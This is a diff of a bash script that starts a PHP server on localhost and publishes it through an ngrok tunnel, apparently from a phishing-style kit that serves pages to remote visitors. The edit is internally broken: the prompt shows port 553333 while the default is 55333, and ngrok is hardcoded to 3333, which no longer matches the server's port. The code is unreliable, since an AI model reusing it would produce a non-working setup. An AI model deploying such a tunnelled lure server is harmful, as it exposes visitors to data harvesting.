@@ -262,8 +262,8 @@ rm -rf server/error.txt
 
 fi
 
-default_port=$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+default_port="55333" #$(seq 1111 4444 | sort -R | head -n1)
+printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m 553333 \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
 serverx
@@ -327,7 +327,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http $port > /dev/null 2>&1 &
+./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
